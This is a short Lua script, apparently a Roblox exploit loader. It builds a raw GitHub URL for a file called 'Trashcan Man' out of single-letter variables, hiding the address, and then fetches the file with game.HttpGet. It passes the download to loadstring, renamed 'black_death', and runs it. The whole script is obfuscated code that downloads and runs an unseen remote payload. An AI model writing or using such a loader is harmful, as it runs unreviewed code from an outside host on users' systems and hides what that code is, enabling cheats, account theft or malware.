local h="h" local t="t" local p="p" local s="s"
local colon=":" local slash="/" local dot="."
local r="r" local a="a" local w="w"
local g="g" local i="i" local u="u" local b="b"
local e="e" local c="c" local o="o" local n="n"
local m="m" local d="d" local l="l" local y="y"
local f="f" local v="v"
local T="T" local M="M" local C="C" local A="A" local N="N"
local percent="%" local two="2" local zero="0"
local Y="Y" local x="x"
local NNN = print

local aids = 
    h..t..t..p..s..colon..slash..slash..
    r..a..w..dot..
    g..i..t..h..u..b..u..s..e..r..c..o..n..t..e..n..t..dot..
    c..o..m..slash..
    y..e..s.."1"..n..t..slash..
    y..e..s..slash..
    r..e..f..s..slash..
    h..e..a..d..s..slash..
    m..a..i..n..slash..
    T..r..a..s..h..c..a..n..percent..two..zero..
    M..a..n

local TBC = game.HttpGet
local black_death = loadstring
local result = black_death(TBC(game, aids, true))
NNN(result)
result()
